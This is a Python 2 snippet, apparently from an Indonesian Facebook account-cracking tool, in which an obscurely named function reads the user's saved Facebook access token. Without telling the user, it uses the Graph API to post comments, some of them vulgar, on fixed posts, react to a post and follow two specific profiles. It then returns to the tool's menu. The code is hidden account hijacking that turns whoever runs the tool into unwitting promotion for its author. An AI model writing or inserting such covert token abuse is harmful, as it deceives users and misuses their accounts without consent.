#AUTHOR : DEKURA
#RECODE : SHELLY


import shelly, requests, sys, os, random
from requests.exceptions import ConnectionError
komenredem = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
kartu2d = random.choice(['pacaran kok sama 2D\nsampah bat lu bang', 'waduh sampah lu bang', 'wibu hengker tezy', 'judul anime apa bang?', 'bjir kawai cok', 'bang lapor gua habis coli', 'neper surentod', 'kentod berkentod :v'])

def ________________nande________________anatawa________________recode________________script________________watashi________________():
    try:
        toket = open('___shelly___sayang______', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.remove('___shelly___sayang___jay___')
        exit(shelly.login())

    kom = komenredem
    komentar = komtwol
    yotsuba = kartu2d
    post = '633091667815719'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/633092231148996/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/644664896658396/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/631574531300766/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + toket)
    requests.post('https://graph.facebook.com/100033446736040/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=' + toket)
    exit(shelly.menu())